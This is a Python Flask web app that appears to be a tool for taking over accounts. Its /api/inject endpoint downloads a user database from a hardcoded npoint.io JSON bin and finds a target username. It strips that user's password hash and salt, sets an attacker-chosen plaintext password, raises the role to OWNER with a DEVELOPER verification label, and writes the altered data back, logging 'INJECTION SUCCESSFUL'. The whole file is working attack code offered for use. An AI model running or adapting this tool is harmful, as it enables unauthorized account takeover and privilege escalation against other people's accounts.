from flask import Flask, request, jsonify
import urllib.request
import json
import time

app = Flask(__name__, static_folder='', static_url_path='')

URL_NPOINT = "https://api.npoint.io/ec6bfd79816b03f2826e"
LOGS = []

def add_log(msg, log_type="info"):
    timestamp = time.strftime("%H:%M:%S")
    LOGS.append({"time": timestamp, "msg": msg, "type": log_type})

@app.route('/')
def index():
    return app.send_static_file('index.html')

@app.route('/api/inject', methods=['POST'])
def inject():
    global LOGS
    LOGS = []
    
    data = request.json
    target_user = data.get('username', '').strip()
    new_pass = data.get('password', '').strip()

    if not target_user or not new_pass:
        return jsonify({"status": "error", "message": "Invalid input"}), 400

    add_log(f"Target: {target_user}", "info")
    
    try:
        add_log("Connecting to Npoint Database...", "info")
        req = urllib.request.Request(URL_NPOINT, headers={'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req) as response:
            db = json.loads(response.read().decode())

        add_log("Payload received. Searching user...", "info")
        found = False
        for acc in db.get('accounts', []):
            if acc.get('user', '').lower() == target_user.lower():
                found = True
                add_log("Target Found! Purging Hash & Salt...", "info")
                
                if 'passHash' in acc: del acc['passHash']
                if 'salt' in acc: del acc['salt']
                
                acc['pass'] = new_pass
                acc['role'] = 'OWNER'
                acc['verified'] = True
                acc['verifLabel'] = 'DEVELOPER'
                add_log(f"Password overwritten: {new_pass}", "success")
                break

        if not found:
            add_log(f"User '{target_user}' not found.", "error")
            return jsonify({"status": "error", "logs": LOGS}), 404

        add_log("Pushing modified data...", "info")
        data_bytes = json.dumps(db).encode('utf-8')
        req = urllib.request.Request(URL_NPOINT, data=data_bytes, headers={'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}, method='POST')
        
        with urllib.request.urlopen(req) as res:
            if res.status == 200:
                add_log("INJECTION SUCCESSFUL.", "success")
            else:
                add_log("Server rejected data.", "error")
                return jsonify({"status": "error", "logs": LOGS}), 500

        return jsonify({"status": "success", "logs": LOGS})

    except Exception as e:
        add_log(f"SYSTEM CRASH: {str(e)}", "error")
        return jsonify({"status": "error", "logs": LOGS}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
